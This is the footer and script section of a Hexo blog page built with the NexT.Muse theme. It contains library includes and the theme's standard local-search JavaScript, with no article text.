  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>




  
  
  
  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">

  
  
  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
  

  <script src="/js/src/algolia-search.js?v=5.1.4"></script>



  

  

  

  
  

  

  

  

</body>
</html>
